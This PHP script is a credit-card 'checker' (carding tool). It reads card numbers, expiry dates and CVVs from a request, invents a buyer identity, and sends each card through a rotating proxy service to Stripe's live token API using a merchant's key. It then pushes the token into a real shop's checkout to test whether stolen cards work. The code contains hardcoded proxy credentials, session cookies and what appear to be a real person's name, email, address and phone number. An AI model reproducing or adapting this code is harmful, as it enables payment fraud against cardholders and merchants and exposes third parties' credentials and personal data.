<?php


set_time_limit(0);
error_reporting(0);
//error_reporting(0);
extract($_GET);
function GetStr($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
$seperator = explode("|", $check);
$cc = $seperator[0];
$mes = $seperator[1];
$ano = $seperator[2];
$cvv = $seperator[3];
$get = file_get_contents('https://randomuser.me/api/1.2/');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
        $name = $matches1[1][0];
        preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
        $last = $matches1[1][0];
        preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
        $email = $matches1[1][0];


$username = 'lum-customer-hl_c84101f5-zone-static-route_err-pass_dyn';
$password = '5imyass2u4s2';
$port = 22225;
$session = mt_rand();
$super_proxy = 'zproxy.lum-superproxy.io';
$proxy='13.69.22.40:8080';
$url1 = 'https://api.stripe.com/v1/tokens';
$url2 = 'https://www.anime-shop-online.com/cart';
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,$url1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
   'Host: api.stripe.com',
'User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0',
'Accept: application/json',
'Content-Type: application/x-www-form-urlencoded',
'Referer: https://js.stripe.com/v2/channel.html?stripe_xdm_e=https%3A%2F%2Fwww.thelambcenter.org&stripe_xdm_c=default816925&stripe_xdm_p=1',
'Connection: keep-alive'
    ));
curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[name]='.$name.'+'.$last.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=061ff506-3903-498a-8f51-6c186f16f8ca&muid=7aea1b41-a3a5-4a59-adcd-c1b9697c50d2&sid=9f8fcbca-42eb-4131-9f86-d326ea6a5af2&payment_user_agent=stripe.js%2Fc272b3d3%3B+stripe-js-v3%2Fc272b3d3&referrer=https%3A%2F%2Fwww.anime-shop-online.com%2Fcart&key=pk_live_mw2Cnk8hIQMzEbJMcA2gjYNy&pasted_fields=number%2Ccvc');
$pagamento = curl_exec($ch);
$token = trim(strip_tags(getstr($pagamento,'id": "','"')));
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,$url2);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Host: www.anime-shop-online.com',
 'User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0',
 'Accept: application/json',
 'Content-Type: application/x-www-form-urlencoded',
 'Referer: https://www.anime-shop-online.com/cart',
 'Connection: keep-alive',
 'Cookie: __cfduid=dfc059a1bd0ff45be6a96e79a526c70471563933087; PHPSESSID=4evlpf6jqfslo03jv7oeep7l95; __stripe_mid=7aea1b41-a3a5-4a59-adcd-c1b9697c50d2; caosLocalGa=GA1.3.133423970.1563933093; caosLocalGa_gid=GA1.3.529727106.1563933093; ALIDS_CART=W3sicG9zdF9pZCI6MTY5NzUsInF1YW50aXR5IjoxLCJzaGlwcGluZyI6ImZyZWUiLCJ2YXJpYXRpb24iOlsiMTQ6MTAiXX1d; ads_checkout_form=email%3Daemanu%2540gmx.es%26discount%3D%26first_name%3DEduardo%26last_name%3DVidal%26address%3DTequila%2B1ra%26address_two%3D%26city%3DJalapa%26country%3DMX%26state%3DTabasco%26postal_code%3D86830%26phone_number%3D9931447721%26description%3D%26shipping_cart%3Dfree%26shipping_cart_name%3Dfree%26payment%3Dcc%26step%3D3%26step1%3D1%26step2%3D1%26step3%3D1%26text_discount%3D%26billing_first_name%3D%26billing_last_name%3D%26billing_address%3D%26billing_address_two%3D%26billing_city%3D%26billing_country%3D%26billing_state%3D%26billing_postal_code%3D%26billing_phone_number%3D%26billing_description%3D%26enabled_billing_address%3D1; __stripe_sid=9f8fcbca-42eb-4131-9f86-d326ea6a5af2'
     ));
curl_setopt($ch, CURLOPT_POSTFIELDS, 'email=aemanu%40gmx.es&register=0&password=&repeatPassword=&first_name=Eduardo&last_name=Vidal&address=Tequila+1ra&address_two=&country=MX&state=Tabasco&postal_code=86830&city=Jalapa&phone_number=9931447721&description=&shipping_cart=free&discount=&type=cc&stripeToken='.$token.'&ads_checkout=ads&discount=');
$pagamento = curl_exec($ch);
curl_close($ch);
echo 'Dead - '.$pagamento;
ob_flush();
///echo $pagamento;
?>